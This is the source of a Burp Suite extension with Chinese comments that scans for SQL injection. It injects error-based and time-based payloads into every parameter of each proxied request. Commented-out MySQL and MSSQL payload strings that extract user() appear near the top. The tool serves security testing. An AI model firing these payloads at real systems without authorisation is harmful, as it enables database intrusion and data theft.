# -*-coding:utf-8 -*-
# 被动扫描注入检测
from burp import IBurpExtender, IScannerCheck, IScanIssue, IMessageEditorTabFactory, IContextMenuFactory
from javax.swing import JMenuItem
import sys
import re
import time
from threading import Thread
import json
import os
from urlparse import urlparse
import xml
from collections import OrderedDict
from queue import Queue

# 盲注payload的时间
TIMEOUT = 8

# XML文件
PAYLOADS_XML = "xml/payloads.xml"
ERROR_REGEXP_XML = "xml/errors.xml"


# 从xml中读取payload字典当中
def read_xml_payloads():
    payloads_dict = OrderedDict()  # payloads

    DOMTree = xml.dom.minidom.parse(PAYLOADS_XML)
    collection = DOMTree.documentElement

    dbms_collection = collection.getElementsByTagName("dbms")
    for dbms_node in dbms_collection:
        dbms = str(dbms_node.getAttribute("value"))
        payloads_dict[dbms] = []
        payloads = dbms_node.getElementsByTagName('payload')
        for payload in payloads:
            payload = payload.getAttribute("value")
            payloads_dict[dbms].append(payload)

    return payloads_dict

# 从xml中读取报错规则
def read_xml_errors():
    errors_regexp_dict = OrderedDict()  # 报错正则

    DOMTree = xml.dom.minidom.parse(ERROR_REGEXP_XML)
    collection = DOMTree.documentElement

    dbms_collection = collection.getElementsByTagName("dbms")
    for dbms_node in dbms_collection:
        dbms = str(dbms_node.getAttribute("value"))
        errors_regexp_dict[dbms] = []
        error_regexps = dbms_node.getElementsByTagName('error')
        for each in error_regexps:
            error_regexp = each.getAttribute("regexp")
            errors_regexp_dict[dbms].append(error_regexp)

    return errors_regexp_dict

class FuzzSQL:
    def __init__(self):

        # 单引号，双引号，宽字节+单引号，宽字节+双引号，反斜杠，负数，特殊字符，and，or，xor探测是否存在注入！！！
        # self.error = ["'", '"', '\\', '%df%27', '%df%22',
        #               '/***/and/***/(select/***/1/***/from(select/***/count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x/***/from/***/information_schema.character_sets/***/group/***/by/***/x)a)--+',
        #               "'/***/and/***/(select/***/1/***/from(select/***/count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x/***/from/***/information_schema.character_sets/***/group/***/by/***/x)a)--+",
        #               '"/***/and/***/(select/***/1/***/from(select/***/count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x/***/from/***/information_schema.character_sets/***/group/***/by/***/x)a)--+'
        #
        #               '/***/and/***/(select/***/1/***/from/***/(select/***/count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b/***/from/***/information_schema.tables/***/group/***/by/***/b)a)--+',
        #               "'/***/and/***/(select/***/1/***/from/***/(select/***/count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b/***/from/***/information_schema.tables/***/group/***/by/***/b)a)--+",
        #               '"/***/and/***/(select/***/1/***/from/***/(select/***/count(*),concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))b/***/from/***/information_schema.tables/***/group/***/by/***/b)a)--+',
        #
        #               '/***/union/***/select/***/count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x/***/from/***/information_schema.tables/***/group/***/by/***/x/***/--+',
        #               "'/***/union/***/select/***/count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x/***/from/***/information_schema.tables/***/group/***/by/***/x/***/--+",
        #               '"/***/union/***/select/***/count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x/***/from/***/information_schema.tables/***/group/***/by/***/x/***/--+',
        #
        #               '/***/and/***/(updatexml(1,concat(0x5e5e5e,(select/***/user()),0x5e5e5e),1))--+',
        #               "'/***/and/***/(updatexml(1,concat(0x5e5e5e,(select/***/user()),0x5e5e5e),1))--+",
        #               '"/***/and/***/(updatexml(1,concat(0x5e5e5e,(select/***/user()),0x5e5e5e),1))--+',
        #
        #               '/***/and/***/(extractvalue(1,concat(0x5e5e5e,(select/***/user()),0x5e5e5e)))--+',
        #               '"/***/and/***/(extractvalue(1,concat(0x5e5e5e,(select/***/user()),0x5e5e5e)))--+',
        #               "'/***/and/***/(extractvalue(1,concat(0x5e5e5e,(select/***/user()),0x5e5e5e)))--+"
        #               ]
        #
        #
        # self.blind = ['/***/and/***/sleep(/***/if(/***/(select/***/length(database())/***/>0)/***/,/***/{},/***/0/***/)/***/)%23'.format(SLEEP_TIME),
        #               "'/***/and/***/sleep(/***/if(/***/(select/***/length(database())/***/>0)/***/,/***/{},/***/0/***/)/***/)%23".format(SLEEP_TIME),
        #               '"/***/and/***/sleep(/***/if(/***/(select/***/length(database())/***/>0)/***/,/***/{},/***/0/***/)/***/)%23'.format(SLEEP_TIME),
        #
        #               '/***/and/***/If(ascii(substr(database(),1,1))=1,1,sleep(10))--+',
        #               "'/***/and/***/If(ascii(substr(database(),1,1))=1,1,sleep(10))--+",
        #               '"/***/and/***/If(ascii(substr(database(),1,1))=1,1,sleep(10))--+',
        #
        #               '/***/WAITFOR/***/DELAY/***/"0:0:{}"--+'.format(SLEEP_TIME),
        #               "'/***/WAITFOR/***/DELAY/***/'0:0:{}'--+".format(SLEEP_TIME),
        #               '"/***/WAITFOR/***/DELAY/***/"0:0:{}"--+'.format(SLEEP_TIME),
        #
        #
        #
        #               ';WAITFOR/***/DELAY/***/"0:0:10"--+',
        #               "';WAITFOR/***/DELAY/***/'0:0:10'--+",
        #               '";WAITFOR/***/DELAY/***/"0:0:10"--+',
        #
        #               ');WAITFOR/***/DELAY/***/"0:0:10"--+',
        #               "');WAITFOR/***/DELAY/***/'0:0:10'--+",
        #               '");WAITFOR/***/DELAY/***/"0:0:10"--+'
        #             ]


        # payloads
        self.payloads_dict = read_xml_payloads()

        # 报错注入的正则规则
        self.errors_regexp_dict = read_xml_errors()

class BurpExtender(IBurpExtender, IMessageEditorTabFactory, IContextMenuFactory, IScannerCheck):
    def registerExtenderCallbacks(self, callbacks):

        self.fuzzSQL = FuzzSQL()

        # Required for easier debugging:
        sys.stdout = callbacks.getStdout()

        # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。。
        self._callbacks = callbacks

        # 用于获取IExtensionHelpers对象，扩展可以使用该对象执行许多有用的任务。返回：包含许多帮助器方法的对象，用于构建和分析HTTP请求等任务。
        self._helpers = callbacks.getHelpers()

        # 用于设置当前扩展的显示名称，该名称将显示在Extender工具的用户界面中。参数：name - 扩展名。
        self._callbacks.setExtensionName("Passive SQL Check")

        # 注册扫描
        callbacks.registerScannerCheck(self)

        print 'Load successful\nProject payload from https://github.com/lufeirider/SqlChecker'

    # 获取请求的url
    def get_request_url(self, protocol, reqHeaders):
        link = reqHeaders[0].split(' ')[1]
        host = reqHeaders[1].split(' ')[1]
        return protocol + '://' + host + link

    # 获取请求的一些信息：请求头，请求内容，请求方法，请求参数
    def get_request_info(self, request):
        analyzedRequest = self._helpers.analyzeRequest(
            request)  # analyzeRequest用于分析HTTP请求，并获取有关它的各种关键详细信息。生成的IRequestInfo对象
        reqHeaders = analyzedRequest.getHeaders()  # 用于获取请求中包含的HTTP头。返回：请求中包含的HTTP标头。
        reqBodys = request[analyzedRequest.getBodyOffset():].tostring()  # 获取消息正文开始的请求中的偏移量。返回：消息正文开始的请求中的偏移量。
        reqMethod = analyzedRequest.getMethod()  # 获取请求方法
        reqParameters = analyzedRequest.getParameters()
        return analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters

    # 获取响应的一些信息：响应头，响应内容，响应状态码
    def get_response_info(self, response):
        analyzedResponse = self._helpers.analyzeResponse(
            response)  # analyzeResponse方法可用于分析HTTP响应，并获取有关它的各种关键详细信息。返回：IResponseInfo可以查询的对象以获取有关响应的详细信息。
        resHeaders = analyzedResponse.getHeaders()  # getHeaders方法用于获取响应中包含的HTTP标头。返回：响应中包含的HTTP标头。
        resBodys = response[
                   analyzedResponse.getBodyOffset():].tostring()  # getBodyOffset方法用于获取消息正文开始的响应中的偏移量。返回：消息正文开始的响应中的偏移量。response[analyzedResponse.getBodyOffset():]获取正文内容
        resStatusCode = analyzedResponse.getStatusCode()  # getStatusCode获取响应中包含的HTTP状态代码。返回：响应中包含的HTTP状态代码。
        return resHeaders, resBodys, resStatusCode

    # 获取服务端的信息，主机地址，端口，协议
    def get_server_info(self, httpService):
        host = httpService.getHost()
        port = httpService.getPort()
        protocol = httpService.getProtocol()
        ishttps = False
        if protocol == 'https':
            ishttps = True
        return host, port, protocol, ishttps

    # 获取请求的参数名、参数值、参数类型（get、post、cookie->用来构造参数时使用）
    def get_parameter_Name_Value_Type(self, parameter):
        parameterName = parameter.getName()
        parameterValue = parameter.getValue()
        parameterType = parameter.getType()
        return parameterName, parameterValue, parameterType

    # 通过正则匹配是否是报错注入
    def checkErrorSQL(self, text):
        # 判断是否存在报错注入的特征
        for dbms in self.fuzzSQL.errors_regexp_dict.keys():
            for regexp in self.fuzzSQL.errors_regexp_dict[dbms]:
                regexp_ret = re.search(regexp, text)                # 正则匹配出的结果
                if regexp_ret:
                    return True, dbms, regexp_ret.group(0)
        return False, None, None

    # 保存注入点
    def save(self, content):
        with open('isSQL.txt', 'at') as f:
            f.writelines('{}\n'.format(content))

    # 保存检测过的数据包
    def save_checked(self, json_data):
        with open('sqlChecked.txt', 'at') as f:
            f.writelines('{}\n'.format(str(json_data)))

    # 判断是否检测过
    def isNotCheck(self, json_data):
        # 如果sqlChecked文件不存在，说明是第一次执行插件，那么肯定没有被检测过
        if not os.path.exists('sqlChecked.txt'):
            return True

        with open('sqlChecked.txt', 'rt') as f:
            if str(json_data) + '\n' in f.readlines():      # 有记录，认为该数据包检测过
                return False
            else:
                return True

    # 获取请求的时间
    def getRequestsTime(self, request, host, port, ishttps, parameterName, parameterValueSQL, parameterType):
        # 构造参数
        newParameter = self._helpers.buildParameter(parameterName, parameterValueSQL, parameterType)

        # 更新参数，并发送请求
        newRequest = self._helpers.updateParameter(request, newParameter)
        newAnalyzedRequest, newReqHeaders, newReqBodys, newReqMethod, newReqParameters = self.get_request_info(
            newRequest)

        start_time = time.time()

        # 新的响应
        newResponse = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)

        # 请求超时，返回None
        if newResponse == None:
            print '[-] Response is None'
            return 1000
        # newResHeaders, newResBodys, newResStatusCode = self.get_response_info(newResponse)

        end_time = time.time()
        cost_time = end_time - start_time

        return cost_time

    # 检测注入
    def checkInject(self, parameterSQLsQueue):
        while not parameterSQLsQueue.empty():
            request, protocol, host, port, ishttps, parameterName, parameterValue, payload, parameterType, dbms, reqUrl = parameterSQLsQueue.get()
            parameterValueSQL = parameterValue + payload.format(TIMEOUT=TIMEOUT)
            # 构造参数
            newParameter = self._helpers.buildParameter(parameterName, parameterValueSQL, parameterType)

            # 更新参数，并发送请求
            newRequest = self._helpers.updateParameter(request, newParameter)
            newAnalyzedRequest, newReqHeaders, newReqBodys, newReqMethod, newReqParameters = self.get_request_info(
                newRequest)

            start_time = time.time()

            # 新的响应
            newResponse = self._callbacks.makeHttpRequest(host, port, ishttps, newRequest)

            # 请求超时，pass该payload -> 所以continue
            if newResponse == None:
                print '{} Response is None'.format(parameterValueSQL)
                continue
            newResHeaders, newResBodys, newResStatusCode = self.get_response_info(newResponse)


            end_time = time.time()
            cost_time = end_time - start_time       # 获取盲注payload的响应时间

            isErrorSql, isTimeSql = False, False

            # 判断注入类型-时间和报错
            if cost_time > TIMEOUT:
                # 再次探测, 设置payload的超时为0，然后设置相应时间少于4秒则排除网络误报
                parameterValueSQL = parameterValue + payload.format(TIMEOUT=0)
                if self.getRequestsTime(request, host, port, ishttps, parameterName, parameterValueSQL, parameterType) < 4:
                    isTimeSql, regexp_ret = True, None
                else:
                    isTimeSql, regexp_ret = False, None
            else:
                isErrorSql, dbms, regexp_ret = self.checkErrorSQL(newResBodys)

            # 获取请求的url
            newReqUrl = self.get_request_url(protocol, newReqHeaders)

            # 报错注入
            if isErrorSql:
                content = '[+] [Error] dbms: [{}]\nMethod: [{}]\nnReqUrl: [{}]\nparameter: [{}]\nparameterValue: [{}]\nregexp_ret: [{}]\n[Headers] -> {}\n[Bodys] -> {}\n'.format(
                                        dbms, newReqMethod, newReqUrl, parameterName, parameterValueSQL, regexp_ret, newReqHeaders, newReqBodys)
                print '[+] [Error] dbms: [{}]\nReqMethod: [{}]\nReqUrl: [{}]\nparameter: [{}]\nparameterValue: [{}]\nregexp_ret: [{}]\n'.format(
                                    dbms, newReqMethod, newReqUrl, parameterName, parameterValueSQL, regexp_ret)
                self.save(content)
            # 延时注入
            elif isTimeSql:
                content = '[+] [Time] dbms: [{}]\nReqMethod: [{}]\nReqUrl: [{}]\nparameter: [{}]\nparameterValue: [{}]\nregexp_ret: [{}]\n[Headers] -> {}\n[Bodys] -> {}\n'.format(
                                dbms, newReqMethod, newReqUrl, parameterName, parameterValueSQL, regexp_ret, newReqHeaders, newReqBodys)
                print '[+] [Time] dbms: [{}]\nReqMethod: [{}]\nReqUrl: [{}]\nparameter: [{}]\nparameterValue: [{}]\nregexp_ret: [{}]\n'.format(
                                dbms, newReqMethod, newReqUrl, parameterName, parameterValueSQL, regexp_ret)
                self.save(content)
            else:
                pass




    # 开始检测
    def start_run(self, baseRequestResponse):
        # 获取请求包的数据
        request = baseRequestResponse.getRequest()
        analyzedRequest, reqHeaders, reqBodys, reqMethod, reqParameters = self.get_request_info(request)

        # 获取响应包的数据
        # response = currentRequestResponse.getResponse()  # getResponse方法用于检索请求消息。返回：响应消息。
        # resHeaders, resBodys, resStatusCode = self.get_response_info(response)
        # self.save(resBodys)

        # 获取服务信息
        httpService = baseRequestResponse.getHttpService()
        host, port, protocol, ishttps = self.get_server_info(httpService)

        # 获取请求的url
        reqUrl = self.get_request_url(protocol, reqHeaders)

        # 分离出参数名, 例如：parameterNames: PHPSESSID&uname&passwd&submit
        parameterNames = ''
        for parameter in reqParameters:
            parameterName, parameterValue, parameterType = self.get_parameter_Name_Value_Type(parameter)
            parameterNames += parameterName + '&'
        parameterNames = parameterNames[:-1]

        # 过滤出没有参数的url，例如：noParameterUrl: http://192.168.168.139/sql_injection/sql_num.php
        url_parse = urlparse(reqUrl)
        noParameterUrl = url_parse.scheme + '://' + url_parse.netloc + url_parse.path

        # print 'reqUrl : ', reqUrl
        # print 'noParameterUrl : ', noParameterUrl
        # print 'reqMethod : ', reqMethod
        # print 'parameterNames : ', parameterNames

        # 通过url，方法，参数 -> 识别数据包是否检测过
        json_data = {"noParameterUrl": noParameterUrl, "method": reqMethod, "parameterNames": parameterNames}
        if not self.isNotCheck(json_data):
            print '[checked] {}'.format(json_data)
            return True
        self.save_checked(json_data)

        # 打印payload
        # for dbms in self.fuzzSQL.payloads_dict:
        #     for payload in self.fuzzSQL.payloads_dict[dbms]:
        #         print payload

        # 将payload加载到队列里
        parameterSQLsQueue = Queue(-1)  # payload队列
        for parameter in reqParameters:
            parameterName, parameterValue, parameterType = self.get_parameter_Name_Value_Type(parameter)
            for dbms in self.fuzzSQL.payloads_dict:
                for payload in self.fuzzSQL.payloads_dict[dbms]:
                    parameterSQLsQueue.put([request, protocol, host, port, ishttps, parameterName, parameterValue, payload,
                                    parameterType, dbms, reqUrl])  # 构造新的参数值，带有sql测试语句

        # 多线程跑每个payload
        threads = []
        for i in range(10):
            t = Thread(target=self.checkInject, args=(parameterSQLsQueue, ))
            t.start()
            threads.append(t)

        for t in threads:
            t.join()

        print '#' * 60 + 'end' + '#' * 60



    def doPassiveScan(self, baseRequestResponse):
        self.start_run(baseRequestResponse)
        # currentRequestResponse = self.invocation.getSelectedMessages()[0]  # getSelectedMessages()返回IHttpRequestResponse 数组，但有时为1个，有时2个


